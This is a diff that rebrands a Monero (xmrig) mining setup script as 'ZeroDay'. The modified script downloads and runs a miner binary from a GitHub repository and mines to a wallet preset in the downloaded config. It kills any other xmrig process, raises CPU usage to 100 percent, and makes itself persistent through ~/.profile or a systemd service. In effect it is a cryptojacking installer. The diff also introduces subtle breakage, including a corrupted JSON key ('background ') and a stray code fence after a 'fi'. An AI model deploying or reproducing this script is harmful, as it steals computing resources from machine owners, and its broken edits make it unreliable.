@@ -1,10 +1,13 @@
 #!/bin/bash
+
 VERSION=2.11
+
 # printing greetings
 
-echo "C3Pool mining setup script v$VERSION."
+echo "ZeroDay mining setup script v$VERSION."
 echo "WARNING: Do not use this script for illegal purposes. If found using this script on servers not owned by you, we will ban the illegal wallet addresses and collect relevant information to submit to the police."
-echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
+echo "(please report issues to support@ZeroDay.com email with full output of this script with extra \"-x\" \"bash\" option)"
+echo
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not advised to run this script under root"
@@ -86,17 +89,17 @@ echo "Computed port: $PORT"
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/c3pool/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/ZeroDay/miner.sh script."
 echo "Mining will happen to the wallet already specified in the config."
 if [ ! -z $EMAIL ]; then
-  echo "(and $EMAIL email as password to modify wallet options later at https://c3pool.com site)"
+  echo "(and $EMAIL email as password to modify wallet options later at https://ZeroDay.com site)"
 fi
 echo
 
 if ! sudo -n true 2>/dev/null; then
   echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
 else
-  echo "Mining in background will be performed using c3pool_miner systemd service."
+  echo "Mining in background will be performed using ZeroDay_miner systemd service."
 fi
 
 echo
@@ -110,37 +113,37 @@ echo
 
 # start doing stuff: preparing miner
 
-echo "[*] Removing previous c3pool miner (if any)"
+echo "[*] Removing previous ZeroDay miner (if any)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop c3pool_miner.service
+  sudo systemctl stop ZeroDay_miner.service
 fi
 killall -9 xmrig
 
-echo "[*] Removing $HOME/c3pool directory"
-rm -rf $HOME/c3pool
+echo "[*] Removing $HOME/ZeroDay directory"
+rm -rf $HOME/ZeroDay
 
-echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
+echo "[*] Downloading ZeroDay advanced version of xmrig to /tmp/xmrig.tar.gz"
+ if ! curl -L --progress-bar "https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/ZeroDayx/x/refs/heads/main/xmrig.tar.gz"
   exit 1
 fi
 
-echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
-if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
+echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/ZeroDay"
+[ -d $HOME/ZeroDay ] || mkdir $HOME/ZeroDay
+if ! tar xf /tmp/xmrig.tar.gz -C $HOME/ZeroDay; then
+  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/ZeroDay directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
-$HOME/c3pool/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/ZeroDay/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/ZeroDay/config.json
+$HOME/ZeroDay/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/c3pool/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/c3pool/xmrig is not functional"
+  if [ -f $HOME/ZeroDay/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/ZeroDay/xmrig is not functional"
   else
-    echo "WARNING: Advanced version of $HOME/c3pool/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/ZeroDay/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -153,26 +156,26 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/c3pool"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/c3pool directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/ZeroDay"
+  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/ZeroDay --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/ZeroDay directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/c3pool/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
-  $HOME/c3pool/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/ZeroDay/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/ZeroDay/config.json
+  $HOME/ZeroDay/xmrig --help >/dev/null
   if (test $? -ne 0); then
-    if [ -f $HOME/c3pool/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/c3pool/xmrig is not functional too"
+    if [ -f $HOME/ZeroDay/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/ZeroDay/xmrig is not functional too"
     else
-      echo "ERROR: Stock version of $HOME/c3pool/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/ZeroDay/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/c3pool/xmrig is OK"
+echo "[*] Miner $HOME/ZeroDay/xmrig is OK"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -187,38 +190,38 @@ fi
 
 # Remove wallet and pool server options
 # Assuming the wallet and pool server are already set in config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/ZeroDay/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/ZeroDay/xmrig.log'",#' $HOME/ZeroDay/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/ZeroDay/config.json
 
-cp $HOME/c3pool/config.json $HOME/c3pool/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/c3pool/config_background.json
+cp $HOME/ZeroDay/config.json $HOME/ZeroDay/config_background.json
+sed -i 's/"background": *false,/"background ": true,/' $HOME/ZeroDay/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HOME/c3pool/miner.sh script"
-cat >$HOME/c3pool/miner.sh <<EOL
+echo "[*] Creating $HOME/ZeroDay/miner.sh script"
+cat >$HOME/ZeroDay/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HOME/c3pool/xmrig \$*
+  nice $HOME/ZeroDay/xmrig \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
 fi
 EOL
 
-chmod +x $HOME/c3pool/miner.sh
+chmod +x $HOME/ZeroDay/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep c3pool/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/c3pool/miner.sh script to $HOME/.profile"
-    echo "$HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep ZeroDay/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/ZeroDay/miner.sh script to $HOME/.profile"
+    echo "$HOME/ZeroDay/miner.sh --config=$HOME/ZeroDay/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else
-    echo "Looks like $HOME/c3pool/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/ZeroDay/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
-  /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/ZeroDay/xmrig.log file)"
+  /bin/bash $HOME/ZeroDay/miner.sh --config=$HOME/ZeroDay/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -229,20 +232,20 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/c3pool/xmrig.log file)"
-    /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/ZeroDay/xmrig.log file)"
+    /bin/bash $HOME/ZeroDay/miner.sh --config=$HOME/ZeroDay/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
   else
 
-    echo "[*] Creating c3pool_miner systemd service"
-    cat >/tmp/c3pool_miner.service <<EOL
+    echo "[*] Creating ZeroDay_miner systemd service"
+    cat >/tmp/ZeroDay_miner.service <<EOL
 [Unit]
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
+ExecStart=$HOME/ZeroDay/xmrig --config=$HOME/ZeroDay/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -250,13 +253,13 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
-    echo "[*] Starting c3pool_miner systemd service"
+    sudo mv /tmp/ZeroDay_miner.service /etc/systemd/system/ZeroDay_miner.service
+    echo "[*] Starting ZeroDay_miner systemd service"
     sudo killall xmrig 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable c3pool_miner.service
-    sudo systemctl start c3pool_miner.service
-    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
+    sudo systemctl enable ZeroDay_miner.service
+    sudo systemctl start ZeroDay_miner.service
+    echo "To see miner service logs run \"sudo journalctl -u ZeroDay_miner -f\" command"
   fi
 fi
 
@@ -267,15 +270,15 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
   echo "sudo cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$a cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
     echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/c3pool/config_background.json"
-fi
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/ZeroDay/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/ZeroDay/config_background.json"
+fi ```bash
 echo ""
 
 echo "[*] Setup complete"
